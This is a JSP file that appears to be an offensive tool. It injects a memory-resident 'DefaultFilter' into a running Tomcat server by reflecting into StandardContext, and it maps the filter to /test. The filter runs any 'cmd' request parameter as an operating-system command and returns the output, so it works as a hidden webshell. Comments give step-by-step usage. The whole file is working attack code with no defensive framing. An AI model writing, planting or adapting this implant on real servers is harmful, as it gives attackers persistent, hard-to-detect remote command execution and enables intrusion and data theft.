<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>

<!-- tomcat 8/9 -->
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>

<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.annotation.WebServlet" %>
<%@ page import="javax.servlet.http.HttpServlet" %>
<%@ page import="javax.servlet.http.HttpServletRequest" %>
<%@ page import="javax.servlet.http.HttpServletResponse" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="java.util.Map" %>


<!-- 1 revise the import class with correct tomcat version -->
<!-- 2 request this jsp file -->
<!-- 3 request xxxx/this file/../test?cmd=calc -->

<%

    class DefaultFilter implements Filter {
        @Override
        //初始化参数，在创建Filter时自动调用
        public void init(FilterConfig filterConfig) throws ServletException {
        }

        //拦截到要执行的请求时，doFilter就会执行
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            // HttpServletResponse response = (HttpServletResponse) servletResponse;
            String cmd = servletRequest.getParameter("cmd");
            if (req.getParameter("cmd") != null) {
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
                return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }

        //在销毁Filter时自动调用
        public void destroy() {
        }

    }
%>


<%
    //Filter name
    String name = "DefaultFilter";
    //从org.apache.catalina.core.ApplicationContext反射获取context方法
    ServletContext servletContext = request.getSession().getServletContext();
    //获取StandardContext
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    //获取ApplicationContext
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    //判断是否存在DefaultFilter这个filter，如果没有则准备创建
    if (filterConfigs.get(name) == null) {
        //定义一些基础属性、类名、filter名等
        DefaultFilter filter = new DefaultFilter();

        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        filterDef.setFilter(filter);

        //添加filterDef
        standardContext.addFilterDef(filterDef);

        //创建filterMap，设置filter和url的映射关系
        FilterMap filterMap = new FilterMap();
        // filterMap.addURLPattern("/*");
        filterMap.addURLPattern("/test");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        //添加我们的filterMap到所有filter最前面
        standardContext.addFilterMapBefore(filterMap);

        //反射创建FilterConfig，传入standardContext与filterDef
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

        //将filter名和配置好的filterConifg传入
        filterConfigs.put(name, filterConfig);
        out.write("Inject success!");
    } else {
        out.write("Injected");
    }
%>